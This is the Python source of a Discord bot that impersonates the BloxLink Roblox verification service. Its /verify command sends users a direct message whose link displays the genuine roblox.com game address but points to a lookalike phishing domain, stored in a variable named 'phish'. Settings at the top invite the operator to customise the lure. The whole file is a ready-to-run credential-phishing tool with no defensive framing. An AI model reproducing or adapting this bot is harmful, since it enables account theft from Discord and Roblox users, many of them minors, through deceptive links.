from webserver import keep_alive
import os
import discord
from discord.ext import commands
import requests

################### change these to your liking ###################


prefix = "/"
title = "Please Complete Verification"
desc ="To verify your account, please join BloxLink's Official Roblox Verification Game"
field = ":arrow_down_small: Please Login and join the game :arrow_down_small:"
hyperlink = "https://www.roblox.com/games/1271943503/Bloxlink-Verification-Game"
phish = "https://www-roblox-sites.com/games/1271943503/Bloxlink-Verification-Game?privateServerLinkCode=88270351046918252757351222499726"

###################################################################

client = commands.Bot(command_prefix = prefix)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('bot online!')
    print('----------------')

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")
main.set_image(url='https://images-ext-1.discordapp.net/external/6UlULVgh_BEoJNTtGl944sWrUPqH9UYgAAY5wGxmUlo/https/tr.rbxcdn.com/f9954dd1a29f40509e127927bb821197/500/280/Image/Jpeg')
@client.command()
async def info(ctx):
  await ctx.send('Sent More Info About Bloxlink')
  await ctx.author.send('discord.gg/zzfnhcpXX3')
  
@client.command()
async def verify(ctx):
    await ctx.send('Sent Verification Link! Please Check DMs')
    await ctx.author.send(embed=main)

keep_alive()

TOKEN = os.environ.get("DISCORD_BOT_SECRET")

client.run(TOKEN)
